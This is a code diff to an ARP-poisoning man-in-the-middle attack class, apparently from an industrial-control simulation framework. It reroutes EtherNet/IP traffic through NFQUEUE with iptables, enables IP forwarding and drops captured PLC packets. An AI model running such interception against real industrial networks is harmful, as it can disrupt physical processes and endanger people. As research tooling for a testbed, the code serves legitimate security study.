@@ -49,8 +49,8 @@ class SimpleStaleAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
-        os.system(
-            f'iptables -t mangle -A FORWARD -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -A PREROUTING -p tcp --sport 44818 -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -A PREROUTING -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
@@ -84,17 +84,16 @@ class SimpleStaleAttack(SyncedAttack):
         in between 100 and 116, we are dealing with a CIP packet. We then change the payload of that
         packet and delete the original checksum.
         """
+        self.logger.info('Testing')
+        os.system('sysctl -w net.ipv4.ip_forward=1')
         while self.run_thread:
-            self.logger.info('Testing')
-            continue
             try:
                 for packet in self.queue:
-                    packet.mangle()
+                    packet.drop()
             except fnfqueue.BufferOverflowException:
-                print("Buffer Overflow in a MITM attack!")
+                self.logger.error("Buffer Overflow in a MITM attack!")
             except Exception as exc:
-                print("Exception in a MITM attack!:", exc)
-                print(traceback.format_exc())
+                self.logger.error("Exception in a MITM attack!:", exc)
 
     def interrupt(self):
         """
@@ -111,6 +110,7 @@ class SimpleStaleAttack(SyncedAttack):
         It first restores the arp poison, to point to the original router and PLC again. Afterwards
         it will delete the iptable rules and stop the thread.
         """
+        os.system('sysctl -w net.ipv4.ip_forward=1')
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
         if self.intermediate_yaml['network_topology_type'] == "simple":
             for plc in self.intermediate_yaml['plcs']:
@@ -120,8 +120,8 @@ class SimpleStaleAttack(SyncedAttack):
         self.logger.info(f"Stop Simple Stale MiTM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-        os.system(
-            f'iptables -t mangle -D FORWARD -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -D PREROUTING -p tcp --sport 44818 -j NFQUEUE --queue-num 1')
+        os.system('iptables -t mangle -D PREROUTING -p tcp --dport 44818 -j NFQUEUE --queue-num 1')
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
